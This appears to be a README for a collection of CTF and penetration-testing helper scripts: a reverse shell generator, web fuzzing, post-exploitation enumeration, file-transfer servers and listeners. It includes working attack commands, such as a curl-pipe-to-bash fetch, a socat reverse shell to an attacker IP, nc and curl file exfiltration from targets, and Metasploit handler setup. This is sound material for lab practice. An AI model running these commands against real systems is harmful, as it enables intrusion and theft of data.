# CTF Scripts

This directory contains various helper scripts for CTF challenges and penetration testing.

## Available Scripts

### 1. Reverse Shell Generator (`revshell_gen.py`)

Generates reverse shell payloads for various languages and environments.

**Usage:**
```bash
# Show common shells
python3 revshell_gen.py -l 10.10.14.5 -p 4444

# Show all available shells
python3 revshell_gen.py -l 10.10.14.5 -p 4444 -a

# Generate specific shell type
python3 revshell_gen.py -l 10.10.14.5 -p 4444 -s python3

# List available shell types
python3 revshell_gen.py -l 10.10.14.5 -p 4444 --list
```

**Supported shell types:**
- bash-tcp, bash-196, bash-5
- nc (netcat traditional and OpenBSD)
- python, python3
- perl, php-exec, php-system
- ruby, java, powershell
- socat, awk, nodejs
- bash-url (URL encoded)
- bash-b64 (Base64 encoded)

### 2. Web Fuzzing Helper (`web_fuzz.sh`)

Automates common web enumeration tasks using tools like gobuster, ffuf, nikto, etc.

**Usage:**
```bash
# Run all enumeration types
./web_fuzz.sh -u http://example.com -a

# Directory fuzzing only
./web_fuzz.sh -u http://example.com --dirs

# Virtual host fuzzing
./web_fuzz.sh -u http://example.com --vhosts

# Custom wordlist and extensions
./web_fuzz.sh -u http://example.com --dirs -w /path/to/wordlist.txt -e php,html,js

# Subdomain enumeration
./web_fuzz.sh -u http://example.com --subdomains
```

**Options:**
- `-u, --url`: Target URL (required)
- `-w, --wordlist`: Custom wordlist path
- `-e, --extensions`: File extensions (default: php,html,txt,js)
- `-t, --threads`: Number of threads (default: 50)
- `-o, --output`: Output directory (default: ./web_enum)
- `-a, --all`: Run all enumeration types
- `--dirs`: Directory fuzzing
- `--vhosts`: Virtual host fuzzing
- `--subdomains`: Subdomain enumeration
- `--params`: Parameter fuzzing

### 3. Quick Enumeration Script (`quick_enum.sh`)

A quick Linux enumeration script to run on target machines after getting a shell.

**Usage:**
```bash
# On target machine
bash quick_enum.sh

# Or download and execute
curl http://your-server/quick_enum.sh | bash
```

**What it checks:**
- System information (hostname, kernel, OS)
- Current user and privileges
- Sudo privileges
- SUID files
- World-writable files
- Network information
- Listening ports
- Scheduled tasks (cron jobs)
- Users with shell access
- Password file permissions
- Interesting configuration files
- Environment variables

### 4. HTTP Server Helper (`http_server.sh`)

Quick setup for various HTTP servers for file transfers.

**Usage:**
```bash
# Basic Python HTTP server
./http_server.sh

# Specify port and directory
./http_server.sh -p 9000 -d /tmp

# Use different server type
./http_server.sh -t php -p 8080

# Enable file upload (Python only)
./http_server.sh --upload -p 8000

# Enable HTTPS (requires cert.pem and key.pem)
./http_server.sh --ssl -p 443
```

**Supported server types:**
- python (default) - Python3 http.server
- php - PHP built-in server
- ruby - Ruby WEBrick
- node - Node.js http-server

### 5. Listener Setup Helper (`listener.sh`)

Quick setup for various types of reverse shell listeners.

**Usage:**
```bash
# Basic netcat listener
./listener.sh

# Netcat with rlwrap for better shell
./listener.sh -p 4444 -r

# Socat listener (provides PTY)
./listener.sh -t socat -p 4444

# Metasploit handler
./listener.sh -t msfconsole -m linux/x86/meterpreter/reverse_tcp -p 4444
```

**Listener types:**
- nc - Netcat (traditional)
- socat - Socat (more stable, PTY support)
- msfconsole - Metasploit multi/handler

### 6. Notes Template Generator (`notes_gen.py`)

Creates structured note templates for CTF challenges and documentation.

**Usage:**
```bash
# Generate all templates
python3 notes_gen.py -t all -n BoxName -i 10.10.10.100

# Generate specific template
python3 notes_gen.py -t recon -n BoxName -i 10.10.10.100
python3 notes_gen.py -t checklist
python3 notes_gen.py -t findings

# Specify output directory
python3 notes_gen.py -t all -n BoxName -i 10.10.10.100 -o ./notes
```

**Template types:**
- recon - Full reconnaissance notes template
- checklist - Enumeration checklist
- findings - Security findings report template

## Tips

### Setting up a listener

For reverse shells:
```bash
# Netcat listener
nc -lvnp 4444

# With rlwrap for better shell
rlwrap nc -lvnp 4444

# Socat with PTY
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Metasploit listener
msfconsole -q -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run'

# Or use the helper script
./listener.sh -p 4444 -r
```

### Upgrading shells

Once you have a basic shell:
```bash
# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash

# Script command
/usr/bin/script -qc /bin/bash /dev/null

# Socat (on attacker)
socat file:`tty`,raw,echo=0 tcp-listen:4444
# On target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```

### File transfer

Transfer files to/from target:
```bash
# On attacker (serve files)
python3 -m http.server 8000
# Or use the helper
./http_server.sh -p 8000

# On target (download)
wget http://10.10.14.5:8000/file
curl http://10.10.14.5:8000/file -o file

# Upload with nc
# Attacker: nc -lvnp 4444 > file
# Target: nc 10.10.14.5 4444 < file

# Upload to HTTP server (if upload enabled)
curl -X POST -F "file=@/path/to/file" http://10.10.14.5:8000/upload
```

### Common Workflow

1. **Initial Setup**
```bash
# Create tmux session
../tmux_setup.sh MyBox

# Generate notes templates
python3 notes_gen.py -t all -n MyBox -i 10.10.10.100 -o notes

# Start HTTP server for file transfers
./http_server.sh -p 8000 &
```

2. **Enumeration**
```bash
# Web fuzzing
./web_fuzz.sh -u http://10.10.10.100 -a

# Generate reverse shells
python3 revshell_gen.py -l 10.10.14.5 -p 4444 -a > shells.txt
```

3. **Getting Shell**
```bash
# Start listener in separate pane/window
./listener.sh -p 4444 -r
```

4. **Post-Exploitation**
```bash
# On target
bash quick_enum.sh > enum.txt
```

## Contributing

Feel free to add more scripts or improve existing ones!
